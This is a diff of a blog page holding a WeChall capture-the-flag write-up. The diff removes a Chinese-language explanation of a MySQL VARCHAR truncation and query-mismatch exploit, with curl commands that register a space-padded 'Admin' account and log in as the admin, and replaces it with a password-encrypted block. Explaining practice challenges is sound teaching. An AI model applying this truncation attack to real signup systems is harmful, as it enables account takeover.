@@ -22,20 +22,21 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":false,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
 
-    <meta name="description" content="Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 + 查询不一致导致的权限提升  Challenge 目标是 login as Admin。题目给了 register&#x2F;login 的源码，chall_sql1 表中已有原始 Admin 记录（access_level&#x3D;1337）。 关键源码： 12&#x2F;&#x2F; 注册 — INSERT 语句">
+    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WeChall - Screwed Signup">
 <meta property="og:url" content="https://vkkkv.github.io/wp/WeChall/wechall-screwed-signup/">
 <meta property="og:site_name" content="Hello Navi">
-<meta property="og:description" content="Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 + 查询不一致导致的权限提升  Challenge 目标是 login as Admin。题目给了 register&#x2F;login 的源码，chall_sql1 表中已有原始 Admin 记录（access_level&#x3D;1337）。 关键源码： 12&#x2F;&#x2F; 注册 — INSERT 语句">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-06-11T09:00:23.000Z">
-<meta property="article:modified_time" content="2026-09-09T02:47:51.469Z">
+<meta property="article:modified_time" content="2026-09-23T06:59:49.174Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="exploit">
 <meta property="article:tag" content="mysql">
 <meta property="article:tag" content="php">
+<meta property="article:tag" content="restricted-wechall">
 <meta property="article:tag" content="sql-injection">
 <meta property="article:tag" content="wechall">
 <meta property="article:tag" content="writeup">
@@ -209,7 +210,7 @@ p.spoiler {
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -222,7 +223,6 @@ p.spoiler {
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -243,12 +243,12 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">370</span>
+        <span class="site-state-item-count">328</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -321,7 +321,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-23 14:59:49" itemprop="dateModified" datetime="2026-09-23T14:59:49+08:00">2026-09-23</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -363,34 +363,31 @@ p.spoiler {
     
     
     
-    <div class="post-body" itemprop="articleBody"><blockquote>
-<p>Screwed Signup (Exploit, PHP) by gizmore MySQL VARCHAR 截断 +
-查询不一致导致的权限提升</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>目标是 login as Admin。题目给了 register/login
-的源码，<code>chall_sql1</code> 表中已有原始 Admin
-记录（<code>access_level=1337</code>）。</p>
-<p>关键源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册 — INSERT 语句</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT IGNORE INTO `chall_sql1` VALUES (&#x27;<span class="subst">$uname</span>&#x27;, &#x27;<span class="subst">$pw</span>&#x27;, 0)&quot;</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录校验</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">screwed_signupGetUser</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM `chall_sql1` WHERE `username`=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>漏洞是 <strong>VARCHAR 截断</strong> +
-<strong>查询不一致</strong>：</p>
-<ul>
-<li>表定义 <code>username VARCHAR(24)</code>，但 PHP 的
-<code>preg_match('/^[a-z0-9A-Z ]{3,64}$/D')</code> 允许最长 <strong>64
-字符</strong></li>
-<li><code>trim()</code> 只去掉首尾空格，中间空格保留</li>
-<li>MySQL 在非严格模式下静默截断超长值到 24 字符</li>
-</ul>
-<p>利用步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 注册: username = &quot;Admin&quot; + 19空格 + &quot;a&quot;    (共 25 字符)</span><br><span class="line">   → trim() 保留中间空格（a 在末尾不会被 trim 删掉）</span><br><span class="line">   → regex 通过（3-64 字符规则）</span><br><span class="line"></span><br><span class="line">2. UserExists(&quot;Admin&quot; + 19空格 + &quot;a&quot;) → false（表中无此长字符串记录）</span><br><span class="line"></span><br><span class="line">3. MySQL INSERT 时截断到 VARCHAR(24):</span><br><span class="line">   实际写入: &quot;Admin&quot; + 19 空格      (access_level=0)</span><br><span class="line"></span><br><span class="line">4. 现在表中有两条 Admin 记录：</span><br><span class="line">   - 原始 Admin (access_level=1337) ← 先插入</span><br><span class="line">   - 我们复制的 Admin (access_level=0) ← 后插入</span><br><span class="line"></span><br><span class="line">5. 登录: username = &quot;Admin&quot;（无空格）</span><br><span class="line">   → PasswordMatch 检查 username+password → 找到我们的记录（密码匹配）</span><br><span class="line">   → GetUser 只查 username → WHERE username=&#x27;Admin&#x27; → 返回第一行 → 原始 Admin</span><br><span class="line">   → access_level=1337 &gt; 0 → solved</span><br></pre></td></tr></table></figure>
-<p>关键：<strong><code>PasswordMatch</code> 检查了密码但
-<code>GetUser</code>
-只查用户名</strong>，两条查询的不一致导致权限提升。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/register.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin                    a&amp;password=hack123&amp;password2=hack123&amp;register=Register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/login.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin&amp;password=hack123&amp;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
-
+    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt"
+     data-hbe-format="4"
+     data-wpm="Oh, this is an invalid password. Check and try again, please."
+     data-whm="Oh, this is an invalid password. Check and try again, please."
+     data-salt="b70f1b17561e3d4ff4479154096f811772c402efc568fa6c8c599040451d3dc3"
+     data-nonce="78b187fc0f2c4088cf1adc9c"
+     data-kdf-iterations="600000"
+     data-auto-save="false">
+  <script id="hbeData" type="hbeData">
+    7497c2425c9593f39d744f57d17acceb75dea62533eea1828634ece02e42c1364538bc235609ecfe8ed190e381885a5aa0a9696f2add0bfd1375df2b2772ee680364f402830c3af26f59485a4decae791870973fc0cd24cbcd1dc45d1bd853c18c3c439696fa93cd458c77922d0b3c16649f901c0dd6d61ad72dfcba793f72b4877b4cde871df77633176e4c37733237652469cd63650af78770a54e5d180aab5b02873c912fffb452a802df5ba65f278b20f2d645ce03cd7076359553315ea35a4ba5e0a8b369e6ef91efa8c4cc057d9c9d74ddcd903a4ade8dacde7c48596897d943d0caae8347e704a44187ddbb58df5d6f979582e28686ff4c212b49f8cfaa844cedf2e3b845563842a32f2d75705a1ecac90c9e36dec6c499240dc2c883d418f04e49be924e4072e6f3187e482757239d70f3f4c5d7d4bba052470a98b242422e45c64fc4e9a49d130a1d7b65fe566ba8ee69f6b87cd5e49d17f4693de00f66833dd954bfce8d1664b2cc804d1dbb464bd23f4feb59b39e7d16969d07f844cda9cacc2e999f8e0d6051aa09b66952b748ef6866509282ffe4949f7b0f28c9fc7b1ab2d825f9e1d90b6ae47aa4e60e040d2bd9ff05718290adaf5563ae9d662d690cd5a73e28adaa2d4c8a9540a266f10192701b513d3e73814da727fdfd6135a750a88fb5b98f147643de04d9f7bc9e0b673d313f0623d4063c9f08b2e243c16c362ecab9dd38e07dd2ea797a492028600784b14f847517edcea7bee05991b7a7dd529a17d0408f700f6d57cf31a19a6bc01343059772ae930606902f2465e0f86184af825289184537f1c0ff1880a58a8e5b62f79edd98aa4a89918f73fbf56bd3757388ee26642b540d5daa975d8cc6ba53ab96c3bc826820267c1d04c787f943fbbd9d8f17dbd4f291ca6e2eb58258544c8dbee5003faddfce6d31e41b8294114bdfd83dfa4ab1be23ed7e686d9f33406e13cf7bd66073b696783fe611394dcc6811bbfd69942f1fcf01865abbcb88a33ea7058920836e92d6d6554730fc30f7c55b63df2334f5c7edbed688575a87996c7adeda6a81e50e6bc458fce7c267c46efbb32a4cf7566986056f3766f75d90ef170383b6569fc08b9c3ce3b5d56bc775e9cb8d8d4a6c6173f2b81385407c52be16c5fca587993311eb8272f552ebac19d2976cb19f1189059bbfd2f4eb090344c0be8004ace2a3799fa4fb0e980a0ffc0394eaa213118d66913125b79f0ff9836b1e9a91376f0667f52c7dfd2912ee7e15955835d8d20fffc569f68f489eac494c94fc745a7a9459193182725bd5581f2fb155ee977290560f3708a2ec88d885f0b8557bddb03363619daa1b9b59da2eb41f0dffa9df5a1184742b6954093f8fb52145de539b45fa181453409506bad921dc9f3d6093304249017ad0edfd7c0fe62ab5e246e9e9e301ece011e583fc2fa0db1e30da85a3777596c21c527831c2839238c93ddc62f0a2e288123dd46d9b4613daa46584c28788eae4f971a2882c2f112a442cfd0c3def17c51e8668ea1582c9b9d198a33e1dad2edca1f719bc59e3bf3a994373ee843740270bfc2e59b1f2e93d418dd51192b5df42da03a1be6398565b5b0170bd099da97b0b096a305f9756c9444cfdcf7c633ab31d3e25bc524213577806f12457f18b6e87c5948f90de85793ac63bd416caa15cb7f18c14feb8a02c156f8683f00568b4ed98a06d9e654df906c15e49ee83f51d03d497ab44cf58167a57909d7459aebe6f2129dbb5feae561035e512ab4e1ecd0eccf99f318adedb11ccca93ebff5691a8a2bdd0ac3a58208b61ba5f1914615d0d68d8a828b26ce956ef496127d6a17ffcceab5619658535fedcd6203b90704e645c99b4df2af5fcadc999eaff8cf946e16bf1c6a0a9ab2225f4bcadf60c76faa4fc5ed674ab76e18f957e648ae407196e3e0559b5e46e3a474dabab351164f3e2a1186af31b237767cdbbf85f10f8ece812c7ddcd813ac73035c09fabf11fc18621803d9266a4fc5c3aa3bd22c1508e9b39c8a43dece1b453fbcfef3c1ee53a923701dea9389930ffabe578761c7f6eb535ba4b1e17465b12a5576ceeebd63993c94a308e675a439571bffd86bd2f93dc4647e6c9a4928ebe5035f73b4e2a5e98f84870ff3038f18317f90be1b11ff1ef6f3dc38daa5af44518329b20802e8ab0ffb12fc23af4ad6e3f6b090c6217b311bf3c55d73fdcdddd559a81d5e48a1634e43e6e4f3c18de9f8d61ea740164f9e5a945b4007fbc284a1ce25d02b62033be3be6e8c44beda60a48b887cacafb6bcd320719fbe31ad65ad439766275985595e893cd577eae48617a83ddf40af517d794d6731e810dbd7e761e48b33974238ed8501b5930c16fbc604c54673e6bca5b884fcaedb5055aaa46eca182ceee9b8db06cd9dfab1ee6255a7e8b7cfd00e7e386711c7a0fd3039055c9a96bc81186bba60cd929e7cf0f0ce76f40725d55e7f0bb5e52c40a700a8846b7337ea104b9e8a50e2fbfc5600870773326a4c7ca18e6b2884ec3a9c09f0228effc824506f87074db14ba73437bfa4775e04a042d3108fa1d168bd5eb3cbc05957e666c1103d182c3c240e691939dec3e055c0a4d34932ab7753fd60bae2b6b8fc204b4822d6e266c796700cad9a3e943b020c10916e790156ec9186d994035a30d11bfde53eccdd19ee35c1302416c2294a7779cb3cb084dc800bde7bcde4838959c8bb542f5e1b112c6e47a844d5f3dac647500bdfbd3907f493c5d28f054547eca5b2b0c3f3fb160219a944fe2fd2ee89372f188fc50e79674a987c85d0854b3e52ffeaba8792a0b33b03bb6836626771c4709233cc8e85981f8a557c37d73d4ab7588420c7f458999eecf496b9cc673d5365129581ae92a438e64029f8c150b8b627966fde4d696d3727c1f300556ac10fb98be74945af241c763ed3f540e6c06ad319eea21d2024bf27c8657f1e3f2945c00af4c943301aef9fa1fb348629c2e627a275b6f36a9130f73f60ea3a868076170959a97f6cdf8ad1dc6b69ff7ca28ddc0cac8afbb46580ee8534f8b3547b06ed9bee46fa2e88a66fe6101822cb66b7389b77da0f04411affdd6985b85228877f5922b246a7d7769ba19d8089a313bd9d6b0ea47e61daa02fa16257f47a3dbf59943b8c79cc11b04788c317e9fc5737e1fc0d2e892fdbc2de859ffc93b2ed2cc75f6d59ddad1f0235091bf12f16344c34010363ad890ebe517e59a5efe4b92c6d96402281c7563c96ca6529b8297fc84cfbea62274da2e41676bd3d1915f87e6c3caee0ad5cd90f0ba4b3362fccdfde0e6d7584d112bdc44b379bbad49b8b97715e7f2f7ed2e92942d750a51b93e5c0b1660c979f30f6ebf268f1c73612b16691bb6d385cd2db7e06c575a7afadd57df270819d378e19b58f5ff506c3c6e54e111423f8e14218faed6a8283cf7889794104701329fdf0a227ecb08355bc82bdabefd617f72f4a9ee176b22c3d9c722eeb5c12e06a1c0ba029c20a48dfdc069a9d39ba4f7065996ff16e1a8daab28ce4221bb85223672c8f51d44bba183005feaf58346311ca65490bde469faea97dda4af6764c26a535c5c625483298fc9011da3a7cbcef413a7d8dee1053f3313590fe122d841b22e376a2e4ca907195afc52eef78069f3852669e5d39d2c52154ade8d33a786869d7bf37b864adea5fc04fdb2f26760fea91b0f30b66b35f1fa1ecc4154e134dcdd2076cb971bf0a85177c7ed15e022904bfff4a63ff1432453a949db43aa279d996eaf24be02bc5ad4f9f31f848c3efa86e99b5444c2c10d11b8ac446e10cfcdb570521b87c693b20e3c8fa9206685f4c6a69bf7cfaf4bf7b4d88ce6a37b29d7a40e9fa3a90b7c74812bc7647718a21d3018c67795076a0fc93d7597818101662a2254c82be32309079c82531d2e822d7fe15e8892d85bd3ba919e5c58aff8d0e4cc0f97ca04eca25d9ed40b2b5631563eb5f6977fc98e98c5f10a6a050f3d8d42a47b4672088b750b8fd4049ac45c3811b372ed78fc5f9de472ea311699402d3c4ceab7be130933eab2371a1f7f47bc08678b4a666b35b49cf54d1bd2bb8978e1cb556bb4a699d0e87c939caa6216880a215f2b328bb2aaf4314fb2b51e5b217eb3a1f60b0d302a05c04c7c2001ee87629b45f9d23146b47d1f76e8dfd585eb8923f46764881a5f464cd55a2c5923ddebb168337c602c069a306a61c505102629b2cd2d15cc1a68e6b7b9f4e4fc710fb2518d375d0f9ad4ef37c6a2fb779f6b79201cf9d64ffb2ae308094283fe6438600d3d21223d37726c7308f9551ff85a5402bdbf040ed5bec86e60dee5fe69ff13ec1db2aeac4b79751975d0de8df8b6c86be15fad0e0e1c131081f89bdf9903f9fae7102d9f70d941846f7aece677eba9428ecfea310040d8081db749eed03711cbf48381882d932e1b88ddc69e64395e337cc787a2c94fa514400e6c92e54231b7aa92618517a8f1bc2a3e13129e3b1a9246d1f8016ee56deab30e807eed98a78c6cf170a3a66726bb09693d64afd0c7f3815d490dd5cce0fada759059ee7dba9af7745b3ff0a5ab7ed48723a4f6cf6c19ce648781687bd7ba63492eb5b6b393c5dc0bf81ab7463647a94fd5915e3e5a936e131849e3094db8f1e618700f37837fc16322ad4ec05d20a1508b17397da63c243714576ad6ef8da5a67ace845180245ec70081f4893f1dede876a43e6418e67dc276e03d21b7b0923958193f60c49af6e663a993d11fb7e034e9820223a1074ccb7c1216bddd40790207c37b00a123ff30d99e7ffcde19c83ca8ce9a606a6cb16dde26b175fce514553b909074fcc625ccf3b09e46e1df561a48ec543a8353efa090699e7eb5b558035b17c5084c7d77e13786f76243534c07236911fadfac6943d4d085f2432a4eeebea34235b547bd135046401456c5dd4e1414e2878e412fcab9242692d835e5d9c31a752d5dc281c7cc10355280ef4b0f92cbe27496a680284476b262a98cce90120355018d59df6bef9ba536a0fe5c7b9c81a9f25e33bfb9741bc767ec89d03da5e2b4aa81d7f5bebca81421f7b5a8bb3cecfb35bd787d65c1d3fcac0788d7cdc7d6c245b00c3d3909e8980527ddaded33b6342d4cc8d51b9fd8d3c31801d559cac9a701ecd9bab27780f5ed971ccafa9b7e49ba09bb2ab479e44e9ad7bba7369fd084f187e3cd19228a9d5dd10848d8d00c3e2ee2fc2a2f4652196709f659627e902146f8c4ef35be32af2e861809e9ade928c748f249ab5d827df20e7f0a9ddf834ad2d98c4123897e4811fbf72f8e2ce6ba23feee885c40ea5d61069bcd25e85891e0ae969407baa7d5aa46af5664dc36f2061e485d3ebe1e1c3d705d226b87341791a82560017aeb5b7f12512de15d44c8250b6c5f87e0878490c59bd8fdbc5551235d9de30b5e37ee632dbdeb92a36161522116b4dc75ecb5e4112b74bf62381b6fa375a3605e4745545da170db4a4af9c64c97863934c05201a3687a9e060ab7473e6a9363a595b0f3df163818f875dd9a65947ccf5d42298dfeccd2a97f9ab64de4fd1c43fac33809d36d4fdb4440dc20013eb4a7718308a17c9c7be66fa816af702fef0dae36225a3b507452a1b2df35692341a3b081e7dd4126e5ea1eaee5ef81f8772bcc680ec440259b29dcdc5fb49a88e0495354d9e0d3dc58df530e2ec9bee18b609ba77edce693c3f6d5bca16f32aaa0326afb71ee3c0da6a73eec8f263a4cf3b5dcdf3eaebcbb635fc20e432a5a7c8ad6d348aaa3e144567f530d301379d990e45082ba4ef08464d9d74fc175c0ae7a737d0618dcf1f2e603e7713d8d520ea949ea37a2ded1f3b6e76e606c40dc19852a9300dc3df030104f4d336bb1a307cbbb45f25d457add338071297d51f5111dce0ee9406f139c61b890b0bc638ea1b29d624e7ed39daf9601421dda53edecded13819acfdacbba04f3e18086aa4a35f57ba5fc2f9ba3b007c17efc690862c2e0c0905676bbbf73f2646ef87c259dd0a417c525014e5a7223b3fa2ea7b1069f33c7fa6ae8e771fa6d7f277d14ae5a79f5c607dab8e5dfa7dfd719b0f5ca1191416d42caa546bfdf36aa4ed001e1e4714864acd01dd23cde3cf442b791d14c40c95ceb5d4e63108cafe305a739bf499f90340f7ceaaee16db99a1ef8888b0f29d9a8578cdb54b28a277288a54e677cfb3268c559a508edae7e88f2386437d91e267cc31b4afebcc3441e885a55ab8f0bf1df4ad4c86d86a5167794e0cb87a0c6a6ce6b8c1442077279d9b9076e0c01e26a5ec1d8c19e2106307aa9f780e3ec6a0af40cc5ab58fdc00446fed2b5919247c62dd2a72ca854b96e50093c10fb3b8ae71daeb4408c93b406292626e40635a47893248fe11d3319162ebcad79921379dfb1c05f6e5c6a293722ff8f78675e2e80b124f2204a7935f1a5be1d2c1be9da218c0c1c302572ab36ace5f8786933737757ca0e02b5225c86c7fb0d04bc32a94384ff8e814fa7b9a460353e0bef0270cbfa7216b5977c63b7f603f5d63286e1a22500a2b16dff5a1964e9a0b57c4f11c594fa34d46384ad1773eddf3c9fbfe3b28da8f7b3d7f64b5948a58539850e977611a0658e990308df5b3f48330e8cf0c1e530becb175b622036043e1d59780c15f978b9cfa1b58f183a1121196134bfa21bd0b2e36d360fcba23f5e0a7c87f79200e64e62a5af8d88e8898f6ae050855dc7aa913648a9eb0d2726e7c1b02b9eaafc66acdf2465fc5371d0a6a9e2bf93aa07c6338bf4e5099b6020cbeab81feb465a33d05a22c569cfa47ff6bdc9ca9cee1a00c159de30c43ef18f93fa3e8a801bed1bd8cd467b7d9c0327769543e7394259b21610a057f0df140baeb97e63cdab66c0b924709c5b157f2b7d8676cd1d1cb14284414b503d328dd1c13d052026a24b1e74488d19c1b1d6a9e18f16cd04ed6c8e9a06d4adeadd96d3fd098fdba42980fe0ac3289382882c27ebb00bd5b82b6946d69c6ecee2ff1d583ab928bf2d0bc0fa3700431c26836240ae47e9b8178e7dbdec56fe00bcd13fde75b36a91e1f97d7c3edc9a06ea86e6c47fa56a4bc2e87fba0bae4339de0982bbcd30f9111997eae5f3c8d400e68ea7e2465817867ed3bd6f9182413e629da1f00ee1c05f70900493753578b20082ffcc554d92e8b53ba4c05187259fea1db457bc0f14f774bb0628ff58dd0bcb58c69063ed1db3d488611b06c0a6d4d7214b80f32b6dde096723d6fae81539ecb680f17bf673a983fe001a4f7a157e50ef5cf8eef4889f461b88b7b4e37e3a7ac17383b080ef5c1fc23d2ef6efc13482601e7dadebb9c48299a5a53857e1f0286041450ae041c78d18ce6eda984e202feae55e5475a25a4de8ded1bc69527f00c070e11e4d70faf0e4287d6a70d14e48177aa2bbf2b8ba012ab86fc5b7616a592622baeddd56ed1c25aceb4617d0cc479d18d3328cb21cdeaccaf5ccb13383ace72bcc5943107529791df5d8e8f261391d1a7bb1ee0a5fe6c256f3256f80834882d5b64b34b14ee8ee1c7920fac87f4242e97e4aad31650e41edc92fd2bb629f8c15f9079ded463eaad000b2e3357bfb079af36696850376d4df17b9004c1f4df85302a0a8f7d8df2db04d11c04c7f9c1098ca821f40bdf66d158bfe96431f2f1d3b7858a2f2647d686b2ad2b1b5e504bd1a15d8fabb63c563e0fe129eb54c42fb350b19cac1893b84d9737ead4c7873135049fdbab2381e75f7f0c476328f6285858561f6c572ae08935a43184dda4ca5349514b5ffe1fe2fcfd1987d1984e7c04bd63b3ccf6defe968584b969d1fc8b3dbe72ca708b00ea450fae5a0896d27ec4fe05a320bcd8d4067a158d3fd64f6a1da2b134cd23e8e2bd70167a5c336ae61fa462822ef57957c1b0ebde26a2d282b12a5834a63b32ac78926c9e48264e6cb42d115ea635b11e019111
+  </script>
+  <div class="hbe hbe-content">
+    <form id="hbeForm" class="hbe hbe-form" onsubmit="return false">
+      <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+      <button class="hbe hbe-button" type="submit">Decrypt</button>
+      <div class="hbe hbe-error" role="alert" aria-live="polite"></div>
+    </form>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.51dd9f3b98.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
     </div>
 
     
@@ -435,10 +432,11 @@ p.spoiler {
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
               <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
               <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql-injection</a>
+              <a href="/tags/restricted-wechall/" rel="tag"><i class="fa fa-tag"></i> restricted-wechall</a>
               <a href="/tags/wechall/" rel="tag"><i class="fa fa-tag"></i> wechall</a>
               <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
-              <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
               <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
           </div>
 
